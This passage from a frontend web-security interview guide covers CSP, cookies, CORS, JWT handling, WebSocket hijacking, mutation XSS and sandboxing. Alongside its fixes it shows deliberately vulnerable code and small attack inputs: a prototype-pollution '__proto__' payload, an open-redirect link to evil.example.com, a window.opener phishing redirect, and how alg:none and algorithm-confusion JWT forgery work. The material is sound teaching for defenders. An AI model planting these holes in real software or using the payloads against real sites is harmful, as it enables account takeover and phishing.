### Q26. [Theory] How do XS-Leaks and Spectre-class side channels threaten the frontend, and what's the modern mitigation architecture?

**XS-Leaks** (cross-site leaks) are side-channel attacks where a malicious site infers *cross-origin* information without ever reading the response directly — defeating the spirit of SOP through observable side effects. Examples: timing how long a cross-origin request takes to infer whether a user is logged in or whether a search returns results; abusing frame counts (`window.frames.length`), `window.opener` references, cache probing, or `Content-Length`/error-event differences to leak state bit by bit. **Spectre** is the CPU-level cousin: speculative execution lets attacker JS read memory across what were assumed to be process/origin boundaries, so any secret co-resident in the same renderer process is potentially readable via a timing side channel.

The mitigation architecture is **isolation at every layer**:

```
- Site Isolation (browser)        -> each site in its own OS process (limits Spectre reach)
- COOP: same-origin               -> no cross-origin window references (kills opener/frame leaks)
- COEP: require-corp              -> subresources must opt in
   COOP+COEP => "crossOriginIsolated" -> safe SharedArrayBuffer + high-res timers
- CORP (Cross-Origin-Resource-Policy: same-origin) -> resources refuse cross-origin embedding
- Fetch Metadata (Sec-Fetch-*)    -> server rejects unexpected cross-site requests
- SameSite cookies / partitioning -> auth state not ambient in cross-site contexts
- Cache partitioning (by top site) -> defeats cross-site cache-probing
```

The expert framing: SOP was designed for a "read-blocking" threat model, but timing and speculative side channels leak *inferred* information that read-blocking never covered. The response was to make the browser **cross-origin isolated by default** (process isolation + COOP/COEP/CORP), reducing what an attacker can co-locate and observe. A staff engineer enabling `SharedArrayBuffer` or precise timers *must* understand they're also opting into the isolation requirements that make those features safe.

### Q27. [Practical] Design a content-security and isolation architecture for a multi-tenant app that embeds untrusted third-party plugins/widgets.

This is a hard sandboxing problem: tenant-authored or third-party code must run in *my* product without being able to steal other tenants' data, the host session, or attack the host DOM. My layered design:

1. **Strong origin isolation per plugin.** Serve each plugin from a **distinct, unguessable origin** (e.g., `<hash>.plugins.usercontent.example.com`) — a "sandbox domain" / suborigin pattern, like GitHub's `*.githubusercontent.com` or Google's `*.googleusercontent.com`. SOP then does the heavy lifting: plugin code on a different origin can't touch the host's cookies or DOM.
2. **Sandboxed iframes.** Embed each plugin in `<iframe sandbox="allow-scripts" ...>` — `allow-scripts` *without* `allow-same-origin` forces the frame into a unique opaque origin, so it can't read the parent or any sibling. Add `allow-forms`/`allow-popups` only as needed; deny `allow-top-navigation`.
3. **Mediated communication via `postMessage`.** No direct DOM access between host and plugin; all interaction goes through a validated, schema-checked `postMessage` channel (origin-checked, structure-validated — see Q21). The host exposes a narrow, capability-based RPC API rather than raw data.
4. **Per-frame CSP** restricting each plugin's `connect-src` (where it can exfiltrate to), `script-src`, and `frame-ancestors`. Combine with **CSP `sandbox`** directive for defense in depth.
5. **Cross-origin isolation (COOP/COEP)** on the host so a Spectre-style compromise in one frame can't read the host process memory; **CORP** on tenant resources to prevent unwanted embedding.
6. **Permissions Policy** (`Permissions-Policy`) to strip dangerous capabilities (camera, geolocation, payment) from plugin frames by default.
7. **Server-side authorization on every API call** — the iframe origin/identity is verified server-side; never trust a tenant ID asserted by the frame.

```
  Host app (app.example.com, cross-origin isolated, BFF holds tokens)
        |
        |  postMessage (origin-checked, schema-validated, capability RPC)
        v
  <iframe sandbox="allow-scripts" src="https://<hash>.plugins.usercontent.example.com">
        - unique opaque origin (no allow-same-origin)
        - own CSP: connect-src locked, frame-ancestors host only
        - Permissions-Policy strips camera/geo/payment
        - cannot read host cookies/DOM (SOP), cannot exfiltrate freely (CSP)
```

The architectural principle: **isolate by origin, mediate by message, authorize on the server.** The sandbox domain + sandboxed iframe gives you SOP-enforced containment for free, which is far more robust than trying to sanitize arbitrary untrusted code inline.

### Q28. [Theory] Critique "JWT in localStorage" as an auth pattern at scale, and contrast revocation strategies.

Storing a self-contained JWT access token in `localStorage` is popular because it's simple and stateless, but at scale it has two compounding problems. **First, XSS exposure** (Q12): `localStorage` is fully readable by any injected script, and a stolen JWT is a portable bearer credential usable from anywhere until expiry — there's no `HttpOnly` protection. **Second, revocation is the Achilles' heel of stateless JWTs.** The whole appeal of a JWT is that the server validates it by signature alone without a lookup — but that means you *cannot* invalidate a token before it expires (no "log out everywhere", no instant ban). Mitigations and their trade-offs:

```
Strategy                     How it works                        Cost
---------------------------  ----------------------------------  ----------------------------
Short-lived access tokens    expire in 5-15 min; refresh often   limits theft window; adds
(+ refresh token)                                                refresh complexity
Server-side denylist         track revoked token jti until exp   reintroduces a lookup
                                                                 (defeats "stateless" purity)
Token versioning / counter   user record holds a version; reject increments invalidate all
(per-user epoch)             tokens with older version           tokens; needs a read per req
Reference/opaque tokens      token is a random id; state in       fully revocable; not stateless
+ introspection              server/Redis                        (a lookup every request)
Refresh-token rotation       each refresh issues a new RT and     detects stolen RT reuse;
                             invalidates the old one              needs server state
```

The expert position: pure stateless JWTs trade revocability for scalability, which is the wrong trade for high-value sessions. At scale I'd use **short-lived access tokens in memory (not localStorage) + rotating refresh tokens in HttpOnly cookies**, or move to **opaque tokens behind a BFF** where server-side session state gives instant, fine-grained revocation. JWTs shine for *short-lived, stateless service-to-service* assertions, not as the durable browser session credential many tutorials suggest.

### Q29. [Practical] How do you build security into the frontend SDLC so vulnerabilities are caught before production?

Security as a one-time audit doesn't scale; it has to be continuous and mostly automated ("shift left"). My program:

- **Design phase:** threat modeling for new features handling auth, payments, or untrusted input (STRIDE-lite); security review gates on architecturally risky changes (new third-party scripts, new origins, auth changes).
- **Code phase:** ESLint security plugins (`eslint-plugin-no-unsanitized`, `eslint-plugin-security`) flagging `innerHTML`/`eval`/`dangerouslySetInnerHTML` in the editor and pre-commit; secret scanning (gitleaks) to stop tokens landing in the repo.
- **Dependency phase:** lockfile enforcement, `npm ci`, Dependabot/Renovate, Snyk/Socket gating PRs on severity, SBOM generation, `--ignore-scripts` in CI.
- **Build/CI phase:** SAST on the frontend code; DAST/ZAP scans against a deployed preview; automated checks that security headers (CSP, HSTS, XFO, COOP) are present and strict; SRI hash verification for pinned CDN assets.
- **Runtime:** CSP `report-to` violation telemetry (an early-warning system for both bugs and live attacks); RASP-style anomaly detection; bug-bounty program; periodic third-party pentests.
- **Culture:** security champions per team, secure-coding training, and blameless postmortems feeding back into lint rules and checklists (each incident should make a *class* of bug structurally harder — see Q25).

The throughline: every control that *can* be automated and gated in CI *should* be, so human review focuses on the genuinely novel risks (new trust boundaries, new third parties) that tools can't reason about.

### Q30. [Coding] Implement a secure token-refresh client for the in-memory-access-token + HttpOnly-refresh-cookie pattern, handling concurrent requests.

**Problem:** Access token lives in memory and expires quickly; the refresh token is an `HttpOnly` cookie the JS can't read. On a 401, transparently refresh and retry — but if 10 requests 401 simultaneously, fire only **one** refresh (avoid a refresh stampede / racing rotated refresh tokens), and queue the rest until it resolves.

```javascript
let accessToken = null;          // in memory only — NEVER localStorage
let refreshPromise = null;       // single in-flight refresh, shared by all callers

async function refreshAccessToken() {
  // credentials: 'include' sends the HttpOnly refresh cookie automatically;
  // JS never reads it. Server rotates the refresh token and sets a new cookie.
  const res = await fetch('/auth/refresh', { method: 'POST', credentials: 'include' });
  if (!res.ok) {
    accessToken = null;
    throw new Error('SESSION_EXPIRED');   // caller redirects to login
  }
  const { access_token } = await res.json();
  accessToken = access_token;
  return access_token;
}

// Collapses concurrent refreshes into ONE network call.
function getFreshToken() {
  if (!refreshPromise) {
    refreshPromise = refreshAccessToken().finally(() => { refreshPromise = null; });
  }
  return refreshPromise;
}

export async function apiFetch(url, options = {}, _retried = false) {
  const headers = new Headers(options.headers || {});
  if (accessToken) headers.set('Authorization', `Bearer ${accessToken}`);

  const res = await fetch(url, { ...options, headers, credentials: 'include' });

  // On 401, refresh once and retry exactly once (prevents infinite loops).
  if (res.status === 401 && !_retried) {
    try {
      await getFreshToken();                       // all concurrent 401s await the same promise
    } catch {
      window.location.assign('/login');            // refresh failed -> session over
      throw new Error('SESSION_EXPIRED');
    }
    return apiFetch(url, options, true);            // retry with new token
  }
  return res;
}
```

**Why this design:** the access token in memory means an XSS attacker only gets a token valid for minutes (and loses it on page reload), while the durable refresh token is `HttpOnly` and unreadable by JS. The shared `refreshPromise` is the key concurrency trick — without it, N simultaneous 401s trigger N refreshes, and with **refresh-token rotation** the server invalidates the old refresh token on first use, so the 2nd..Nth refreshes would fail and log the user out spuriously. **Edge cases:** the single-retry guard (`_retried`) prevents infinite loops if the new token is also rejected; a failed refresh deterministically routes to login; `credentials: 'include'` is required for the cookie to ride along. **Time/Space:** O(1) extra work per request; at most one concurrent refresh regardless of request volume — O(1) network amplification.

---

## 🧩 Extended Questions — Set 1: Deeper Theory & Practical Operations

### 🟢 Basic — extended

#### Q31. [Theory] Break down the cookie security attributes (`HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Max-Age`). What does each protect and what's a safe default?

A session cookie's security is the sum of its attributes, and getting any one wrong undermines the rest. Each attribute controls a different facet of *where* and *when* the cookie is sent and *who* can read it:

```
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
            ^^^^^^^^^^   ^^^^^^^^  ^^^^^^  ^^^^^^^^^^^^^  ^^^^^^  ^^^^^^^^^^^^
            value        no JS     HTTPS   cross-site     scope   lifetime
                         read      only    rule
```

| Attribute | Protects against | Notes |
|-----------|------------------|-------|
| `HttpOnly` | XSS token theft — JS `document.cookie` cannot read it | The single most important flag for session cookies |
| `Secure` | Cookie sent over plaintext HTTP (network sniffing) | Mandatory in 2026; required for `SameSite=None` |
| `SameSite=Lax/Strict/None` | CSRF (Lax/Strict block cross-site sends) | `Lax` is the browser default; `None` requires `Secure` |
| `Domain` | Over-broad scope leaking to subdomains | Omit it to get a *host-only* cookie (most restrictive) |
| `Path` | Sending to unrelated paths | Scopes refresh tokens to e.g. `/auth/refresh` |
| `Max-Age`/`Expires` | Indefinite session lifetime | Omit for a session cookie that dies on browser close |

The safe default for a session cookie is `HttpOnly; Secure; SameSite=Lax` with no `Domain` attribute (host-only). A subtle trap: setting `Domain=example.com` makes the cookie readable by *every* subdomain including `evil.userpages.example.com`, so omitting `Domain` is more secure than setting it explicitly. Another is the `__Host-` prefix — naming a cookie `__Host-sid` forces the browser to *reject* it unless it is `Secure`, has `Path=/`, and has **no** `Domain` attribute, giving you a tamper-evident guarantee that a subdomain didn't inject it. For high-value session cookies in 2026, I use the `__Host-` prefix specifically because it makes the safest configuration unforgeable rather than merely conventional.

#### Q32. [Practical] A junior dev added `target="_blank"` links to user-submitted URLs. Why is that a security bug and how do you fix it?

Opening a link with `target="_blank"` (without precautions) gives the *destination* page a reference to your page via `window.opener`. On older browsers, the opened page could then do `window.opener.location = 'https://phishing.example.com'`, silently navigating your original tab to a phishing clone while the user is busy reading the new tab — this is **reverse tabnabbing**. Because the user trusted your site and never saw the address bar change focus, they may re-enter credentials on the fake page.

```html
<!-- ❌ vulnerable: opened page can navigate this tab via window.opener -->
<a href="{userUrl}" target="_blank">Visit</a>

<!-- ✅ fixed: rel severs the opener relationship -->
<a href="{userUrl}" target="_blank" rel="noopener noreferrer">Visit</a>
```

Modern Chromium, Firefox, and Safari now imply `rel="noopener"` for `target="_blank"` by default, so the raw attack is largely closed in current browsers — but you should still set it explicitly because (a) you cannot assume every user is on a current browser, and (b) `noreferrer` additionally strips the `Referer` header so you don't leak the originating URL (which may contain tokens or internal paths) to a user-controlled destination. The full fix also includes URL-scheme sanitization (see Q20) so the `href` can't be `javascript:`, and for `window.open()` calls the JS equivalent is `window.open(url, '_blank', 'noopener')`. The teaching point for the junior: "secure by default" browser behavior is a safety net, not a substitute for writing the secure attribute yourself.

#### Q33. [Theory] What is an open redirect, why is it dangerous despite "just being a redirect," and how do you prevent it?

An open redirect is an endpoint that takes a destination URL from user input and redirects there without validation — classically a `?returnUrl=` or `?next=` parameter used in login flows ("after you log in, send you back where you were"). The bug: `https://app.example.com/login?next=https://evil.example.com`. It looks harmless because no data is stolen directly, but it is dangerous as a **phishing and trust-laundering primitive** — the attacker sends a link that genuinely starts on *your trusted domain*, so it passes email filters and user scrutiny, then bounces the victim to a credential-harvesting clone. Open redirects also enable **OAuth token theft** (a `redirect_uri` that's an open redirect can leak authorization codes) and **CSP/filter bypasses**.

```javascript
// ❌ trusts arbitrary user input as the redirect target
res.redirect(req.query.next);

// ✅ allowlist + force same-origin relative paths only
function safeRedirect(res, next) {
  // Only allow relative paths that start with a single "/" (not "//evil.com"
  // which is a protocol-relative URL the browser treats as cross-origin).
  if (typeof next === 'string' && /^\/(?!\/)/.test(next)) {
    return res.redirect(next);
  }
  return res.redirect('/dashboard'); // safe default
}
```

The key parsing gotcha is `//evil.example.com` and `/\evil.example.com` — a leading `//` (or `/\`) is a **protocol-relative URL**, so a naive "must start with `/`" check still lets the browser navigate off-site. The robust rule is: accept only relative paths, reject anything with a scheme or a leading `//`/`/\`, or resolve against your origin with `new URL(next, origin)` and verify `parsed.origin === origin`. For the genuinely-cross-site case (rare), maintain an explicit allowlist of permitted destination origins. The mantra mirrors URL sanitization: allowlist, parse don't regex, and default to a known-safe internal path.

#### Q34. [Practical] How do you debug a CORS error in the browser, and what error messages map to which server-side fix?

CORS failures are one of the most-misdiagnosed frontend problems because the browser deliberately hides response details for security, and developers often "fix" them by disabling CORS entirely instead of reading what the browser is telling them. My debugging routine starts in DevTools Network tab: find the failing request, check whether there's a separate `OPTIONS` preflight, and read the exact console message — each phrase maps to a specific server fix.

```
Console message                                          Server-side fix
-------------------------------------------------------  -----------------------------------------
"No 'Access-Control-Allow-Origin' header is present"     Server isn't sending ACAO at all — add it
"...does not match the supplied origin"                  ACAO is hardcoded/wrong — echo the
                                                         validated request Origin
"...Allow-Origin: '*' ... credentials mode is 'include'" Can't use * with credentials — echo a
                                                         specific origin + set Allow-Credentials
"Method PUT is not allowed by Access-Control-            Add PUT to Access-Control-Allow-Methods
 Allow-Methods in preflight response"                    in the OPTIONS response
"Request header authorization is not allowed by          Add authorization to Access-Control-
 Access-Control-Allow-Headers"                           Allow-Headers in the OPTIONS response
"Redirect is not allowed for a preflight request"        Your OPTIONS is 30x redirecting — serve
                                                         200 directly at the CORS endpoint
```

The two highest-leverage diagnostics: first, **confirm whether a preflight is even happening** — a request with `Content-Type: application/json` or an `Authorization` header is "non-simple" and triggers an `OPTIONS` that many backends don't handle, so the real request never fires. Second, **check the response status of the preflight itself** — a 401/403/302 on the `OPTIONS` request (because auth middleware ran on it) is a classic cause; preflights must be unauthenticated and return 2xx. A critical anti-pattern to call out in review: "fixing" CORS by reflecting `Origin` back unconditionally with `Allow-Credentials: true` turns a dev annoyance into a credential-leaking vulnerability (Q11) — the fix is an allowlist, not a wildcard reflection.

### 🟡 Intermediate — extended

#### Q35. [Theory] CSP nonces vs hashes vs host allowlists — when do you use each, and why are host allowlists considered weak?

CSP `script-src` can authorize scripts three ways, and the choice has real security and operational consequences. A **host allowlist** (`script-src 'self' https://cdn.example.com`) permits any script from those origins. **Nonces** (`script-src 'nonce-r4nd0m'`) authorize only `<script>` tags carrying a matching `nonce` attribute, where the nonce is a fresh random value per HTTP response. **Hashes** (`script-src 'sha256-<base64>'`) authorize a specific inline script whose content hashes to the listed value.

```
Mechanism        Good for                          Weakness
---------------  --------------------------------  -------------------------------------------
Host allowlist   Coarse "trust this CDN"           Bypassable: if the CDN hosts ANY callback-
                                                   gadget / JSONP / old Angular, attacker
                                                   abuses it. Hard to keep tight.
Nonce            Dynamic apps, server-rendered     Requires per-response server-side stamping;
                 pages, many scripts               nonce must be cryptographically random &
                                                   never reused or cached.
Hash             Static/known inline scripts,      Must regenerate on every content change;
                 SSG, no server to inject nonces   awkward for dynamic inline code.
```

Host allowlists are considered weak because real-world CDNs and trusted origins frequently host **script gadgets** — JSONP endpoints, outdated AngularJS, or callback parameters — that let an attacker who controls a query parameter execute arbitrary code while technically loading from an allowlisted host. Google's own large-scale study found the majority of allowlist-based CSPs were trivially bypassable. The modern recommendation is a **strict CSP**: `script-src 'nonce-{random}' 'strict-dynamic'`, which discards the host allowlist entirely — `strict-dynamic` says "trust scripts loaded by an already-trusted (nonced) script," so a script gadget on a CDN is no longer a free pass. Use nonces when you render HTML server-side (you can inject a per-request nonce), and hashes when you ship fully static pages with a fixed set of inline scripts and no server in the request path.

#### Q36. [Practical] Your team set `Content-Security-Policy: default-src 'self'` and the app broke — inline styles gone, Google Fonts failing, analytics dead. Walk through diagnosing and fixing each.

A blanket `default-src 'self'` is the most common "I turned on CSP and broke prod" scenario, because `default-src` is the fallback for *every* fetch directive that isn't otherwise specified — so styles, fonts, images, connections, and frames all suddenly require same-origin. The fix is **not** to loosen back to `'unsafe-inline'` everywhere, but to enumerate each legitimate need with a tight, directive-specific rule. I read the console violations one by one:

```
Violation                              Cause                          Targeted fix
-------------------------------------  -----------------------------  --------------------------------
"Refused to apply inline style"        style-src falls back to 'self' Move styles to external CSS;
                                       which forbids style="..." and  if truly needed, use a per-
                                       <style> blocks                 style nonce/hash (NOT
                                                                      'unsafe-inline')
"Refused to load font ... fonts.       font-src not allowed           font-src https://fonts.gstatic.com
 gstatic.com"
"Refused to load stylesheet ...        style-src not allowed          style-src 'self'
 fonts.googleapis.com"                                                https://fonts.googleapis.com
"Refused to connect to ...             connect-src not allowed        connect-src 'self'
 google-analytics.com"                 (XHR/fetch/beacon/WebSocket)   https://*.google-analytics.com
"Refused to load script ...            script-src not allowed         script-src 'self' + nonce the
 googletagmanager.com"                                                GTM loader, use strict-dynamic
```

The resulting policy is explicit and auditable rather than permissive:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{rand}' 'strict-dynamic';
  style-src 'self' https://fonts.googleapis.com;
  font-src https://fonts.gstatic.com;
  connect-src 'self' https://*.google-analytics.com;
  img-src 'self' data: https:;
  object-src 'none'; base-uri 'self'; frame-ancestors 'none';
```

Two operational lessons: first, **inline styles are the silent killer** — third-party widgets and many UI libraries inject `style="..."` attributes that `style-src 'self'` blocks, and the honest fix is migrating to classes or accepting a scoped hash, because `style-src 'unsafe-inline'` reopens a (smaller) injection surface. Second, the way to *avoid this fire drill* is to roll CSP out in report-only mode first (Q18) so you collect every one of these violations from real traffic before they break anyone. Tightening `img-src` to `data:` plus `https:` is a reasonable pragmatic middle-ground for images since image injection is low-risk compared to script.

#### Q37. [Theory] What is prototype pollution, how does it become a frontend security vulnerability, and how do you defend against it?

Prototype pollution is a JavaScript-specific vulnerability where an attacker injects properties into `Object.prototype` — the object that nearly every object inherits from — so the polluted property appears on *all* objects application-wide. It typically enters through unsafe recursive merge/clone/`set`-by-path utilities (a hand-rolled `deepMerge`, or older versions of libraries like `lodash.merge`) that copy attacker-controlled keys including the magic `__proto__`, `constructor`, and `prototype` keys.

```javascript
// ❌ a naive deep-merge that doesn't filter dangerous keys
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
// Attacker sends JSON:  {"__proto__": {"isAdmin": true}}
merge({}, JSON.parse(payload));
({}).isAdmin; // => true   -- EVERY object now claims isAdmin!
```

On the frontend this is dangerous in several ways: it can flip authorization-ish flags an app reads from generic objects (`if (user.isAdmin)`), corrupt config defaults, or — most seriously — **escalate to XSS** when a polluted property feeds a template engine or a DOM sink (e.g., polluting a default `srcdoc`/`innerHTML` option that a sanitizer or template later reads, turning a "harmless" pollution into script execution). The defenses are layered: (1) use `Object.create(null)` for map-like data so there's no prototype to pollute; (2) freeze the prototype at startup with `Object.freeze(Object.prototype)` in security-critical apps; (3) in merge/clone code, explicitly reject keys equal to `__proto__`, `constructor`, and `prototype`, or use `Object.hasOwn`/`Map` instead of `for...in`; (4) parse JSON and validate against a strict schema (Zod/Ajv) so unexpected keys are dropped; and (5) keep libraries patched, since this class produced a long string of CVEs in popular utilities. The root insight: untrusted *keys* are as dangerous as untrusted *values*.

#### Q38. [Practical] Walk through securing a WebSocket connection in a browser app — what's different from HTTP and where do people get it wrong?

WebSockets feel like "just a socket," and that intuition is exactly where people get burned, because several HTTP-era browser protections **do not apply** to the WebSocket handshake. Three things matter most: the handshake's origin handling, authentication, and message-level input handling.

```javascript
// Client — always use wss:// (TLS), never ws:// in production
const ws = new WebSocket('wss://api.example.com/stream');

// Server-side handshake checks (conceptual)
// 1. VALIDATE Origin — the browser sends it, but SOP/CORS do NOT gate WS.
if (!ALLOWED_ORIGINS.has(req.headers.origin)) return reject(403);
// 2. AUTHENTICATE — cookies ARE sent on the handshake (so it's CSRF-able!),
//    so verify a CSRF-style token, not just the cookie.
```

The non-obvious pitfalls: **(a) CORS does not protect WebSockets.** The same-origin policy does not block cross-origin WebSocket *connections* the way it gates `fetch` — the handshake will be sent cross-origin and cookies ride along, so a malicious page can open an authenticated socket to your server. This is **Cross-Site WebSocket Hijacking (CSWSH)**, the WebSocket analogue of CSRF. The server *must* validate the `Origin` header and require an anti-CSRF token in the handshake; relying on the cookie alone is exploitable. **(b) Use `wss://` always** — plaintext `ws://` is sniffable and injectable, and a page loaded over HTTPS can't open `ws://` anyway (mixed content). **(c) Authenticate every connection and re-check authorization per message**, since a long-lived socket can outlive a permission change or token expiry; many teams authenticate the handshake and then trust the socket forever. **(d) Treat every inbound frame as untrusted input** — validate the message schema and never route message content into `innerHTML`/`eval` (same discipline as `postMessage`, Q21). **(e) Rate-limit and cap message size** to prevent a single client from exhausting server memory. The summary framing: a WebSocket inherits the *ambient-authority* CSRF problem from cookies but loses the SOP read-protection and CORS gating, so you must reintroduce origin validation and CSRF tokens explicitly.

#### Q39. [Practical] A pentester reports that your sanitizer is bypassed by "mutation XSS" (mXSS). What is it and how does DOMPurify handle it?

Mutation XSS (mXSS) is a bypass class where a string is *safe* at the moment a sanitizer inspects it, but the browser's HTML parser **mutates** the markup when it's later assigned to `innerHTML`, re-introducing executable content the sanitizer never saw. The browser doesn't store HTML as the literal string you gave it — it parses to a DOM and re-serializes, and that round-trip can change the tree in surprising ways, especially around namespace boundaries (`<svg>`, `<math>`), broken/unclosed tags, and CDATA contexts.

```
Conceptual mXSS shape:

  Input string (looks inert to a string-based or naive sanitizer)
        |
        |  sanitizer approves it (no <script>, no on* handler visible)
        v
  el.innerHTML = approved   ->  BROWSER PARSER REWRITES the tree
        |                       (e.g. an SVG/MathML context confusion
        |                        causes a benign <p> to be reinterpreted
        v                        as an HTML element with an active payload)
  Executable node now exists in the live DOM  ->  XSS
```

The lesson is that **string-matching sanitizers are fundamentally insufficient** because they reason about the input string, not the DOM the browser will actually build. This is precisely why you must use a parser-based, browser-aware sanitizer like **DOMPurify** rather than a regex blocklist or a homegrown allowlist: DOMPurify parses the input into a DOM, walks and cleans the *node tree*, and — critically — was specifically hardened against mXSS by performing the sanitization in a way that accounts for the parser's mutation behavior (re-parsing / serialization checks, namespace handling). Practically: never write your own HTML sanitizer; use DOMPurify and keep it updated (mXSS bypasses are an ongoing arms race and fixes ship in new versions); prefer `textContent` when you don't actually need HTML; and stack defense in depth so that even a future DOMPurify bypass runs into a strict CSP and Trusted Types. When the pentester reports an mXSS bypass in a *current* DOMPurify, that's a genuine 0-day worth reporting upstream — but far more often the report is against a homegrown sanitizer or an outdated DOMPurify version, and the fix is "use the maintained library, updated."

#### Q40. [Theory] Compare `X-Frame-Options` and CSP `frame-ancestors` precisely. If both are present and conflict, what wins, and what are the migration gotchas?

Both headers defend against clickjacking by controlling who may frame your page, but they differ in expressiveness, precedence, and browser handling — and getting the interaction wrong silently weakens your protection. `X-Frame-Options` (XFO) is the legacy header with only two practically-supported values: `DENY` (nobody can frame) and `SAMEORIGIN` (only same-origin can frame). `ALLOW-FROM` exists in the spec but is **deprecated and not supported** by Chromium-based browsers, so it cannot be relied on. CSP `frame-ancestors` is the modern replacement: it accepts a *list* of allowed origins, supports `'none'` and `'self'`, and understands wildcards/schemes.

```
                       X-Frame-Options            CSP frame-ancestors
Multiple allowed       NO (ALLOW-FROM dead)        YES: frame-ancestors
framers                                            https://a.com https://b.com
Granularity            DENY / SAMEORIGIN only      'none' 'self' + origin list
Browser support        legacy, universal           modern, universal in 2026
Precedence when both   ignored by browsers that    WINS where supported
present                support CSP frame-ancestors
```

The precedence rule per the CSP spec: when a browser supports `frame-ancestors`, it **must ignore `X-Frame-Options`** entirely — `frame-ancestors` wins. This matters because of the most dangerous gotcha: if you write a *permissive* `frame-ancestors` thinking XFO `DENY` still backs you up, you've actually *weakened* protection, since modern browsers drop the XFO and honor only the looser CSP. A second gotcha is **conflicting intent** — e.g., `X-Frame-Options: SAMEORIGIN` plus `frame-ancestors 'none'` will, on a modern browser, deny framing (CSP wins) but on a hypothetical CSP-unaware browser allow same-origin framing; you should make them *agree* to avoid surprises. The migration recommendation in 2026: set `frame-ancestors` as the authoritative control and keep an *equivalent-or-stricter* `X-Frame-Options` only as a belt-and-suspenders fallback for ancient clients — never rely on XFO to be stricter than your CSP, because it won't be honored when CSP is present.

### 🟠 Advanced — extended

#### Q41. [Theory] A developer validates JWTs in client-side JS using `jwt.decode()` without verifying the signature, and the backend trusts the `alg` header. Explain both vulnerabilities and the correct approach.

There are two distinct, severe mistakes bundled here, and they illustrate why JWT handling is a perennial source of auth bypasses. **First, client-side "validation" by decoding only.** A JWT is just base64url-encoded JSON with a signature; `jwt.decode()` (without verify) merely base64-decodes the payload — it performs **no cryptographic check**. Any client-side decode is purely informational (e.g., to read the expiry for UX). Trusting decoded claims for any security decision in the browser is meaningless because the user can mint any payload they like; authorization must always be verified server-side against the signature.

```javascript
// ❌ client treats decoded claims as trusted — they are attacker-controlled
const { isAdmin } = jwtDecode(token);   // decode != verify
if (isAdmin) showAdminPanel();          // UX only; NEVER a security gate

// ❌ server: 'alg' confusion / alg:none acceptance
jwt.verify(token, key);                 // if it honors the token's alg header...
```

**Second, the `alg`-header trust bug — two flavors.** (a) **`alg: none`**: the JWT spec defines an "unsecured" mode with no signature; a server that accepts `none` lets an attacker strip the signature and forge any claims. (b) **Algorithm confusion (RS256 → HS256)**: if the server's verify call lets the *token* dictate the algorithm, an attacker can take a server that uses RS256 (public/private keypair) and submit a token signed with **HS256 using the server's public RSA key as the HMAC secret** — since the public key is, by definition, public, they can forge a valid signature. The correct approach: never make security decisions from a client-side decode; on the server **pin the expected algorithm explicitly** (`jwt.verify(token, key, { algorithms: ['RS256'] })`), **reject `none`**, validate `exp`/`nbf`/`iss`/`aud`/`sub`, and use a well-maintained library that defaults to safe behavior. The unifying principle: a JWT's header (including `alg`) is attacker-controlled data, so the verifier — not the token — must decide the algorithm and the trust.

#### Q42. [Practical] Production incident: users report being logged out randomly after you shipped `SameSite=Strict` on the session cookie. Diagnose and resolve.

This is a classic correctness-vs-security regression. `SameSite=Strict` means the session cookie is **never** sent on *any* cross-site request — including top-level navigations where the user clicks a link from another site into yours. So the symptom "randomly logged out" is actually deterministic: it happens specifically when a user arrives at your authenticated app **via an external link** — a password-reset email, an OAuth/SSO provider redirect, a link shared in Slack, a Google search result, a payment-gateway return URL. On that first cross-site navigation the cookie is withheld, your server sees no session, and it bounces them to login (and if they were mid-flow, that looks like a random logout).

```
User clicks link in email (cross-site origin) ──► GET https://app.example.com/dashboard
                                                   │
                          SameSite=Strict ► cookie NOT sent on this navigation
                                                   │
                                                   ▼
                              server sees no session ► redirect to /login  ("logged out!")
```

The diagnosis tools: reproduce by navigating to the app from an external origin (type the URL in a *different* site's link, or use the OAuth return), watch DevTools → Application → Cookies and the request headers to confirm the cookie is absent on that first hit but present on subsequent same-site clicks. The resolution is to **switch the session cookie to `SameSite=Lax`**, which still blocks the dangerous cross-site *POST*/CSRF vector (cookies aren't sent on cross-site form submissions or sub-resource requests) but *does* send them on top-level GET navigations, fixing the link-arrival case. If you specifically need `Strict`-level protection for the most sensitive cookie, the pattern is a **two-cookie split**: a `Lax` "login session" cookie that survives external navigation plus a `Strict` "elevated/step-up" cookie required only for high-risk actions. The broader lesson for the postmortem: security headers have UX side effects, and `SameSite=Strict` in particular breaks federation/email/deep-link flows — it should be rolled out behind monitoring of login-failure and bounce metrics, not flipped blindly.

#### Q43. [Practical] How do you prevent leaking sensitive information through frontend build artifacts — source maps, environment variables, and bundled secrets?

The frontend bundle is fully visible to anyone with DevTools, yet teams routinely ship secrets and internal detail into it because the build tooling makes it *easy* to do accidentally. Three leak channels dominate, and each has a specific control.

**(1) Bundled secrets / API keys.** Anything imported into client code ends up in the shipped bundle — there is no such thing as a "client-side secret." A common bug is putting a server-side API key in a `VITE_`/`NEXT_PUBLIC_`/`REACT_APP_` variable; bundlers **inline** any env var with those public prefixes into the JS. The rule: only truly public values (a publishable Stripe key, a public Mapbox token scoped to your domain) may be exposed; everything privileged must live behind your own backend/BFF and be called server-side.

```bash
# ✅ scan the BUILT bundle for accidental secrets in CI (gate the pipeline)
npx @secretlint/secretlint "dist/**/*.js"
# or
gitleaks detect --source dist/ --no-git

# ❌ this prefix means the value is PUBLIC after build — never put real secrets here
VITE_INTERNAL_DB_PASSWORD=...   # gets inlined into dist/*.js
```

**(2) Source maps.** Source maps reverse your minified bundle back into readable, commented original source — invaluable in dev, a reconnaissance gift to attackers in prod (they reveal internal API routes, comments, business logic, even commented-out secrets). Don't serve `.map` files publicly: either disable source-map generation for the public artifact, or generate them and upload them privately to your error-tracking tool (Sentry/Datadog) with `hidden`/`sourceMapUploadOnly` settings so stack traces stay decoded internally without the maps being web-reachable.

```javascript
// vite.config.js — keep maps out of the public bundle, ship them to Sentry only
export default { build: { sourcemap: 'hidden' } };
```

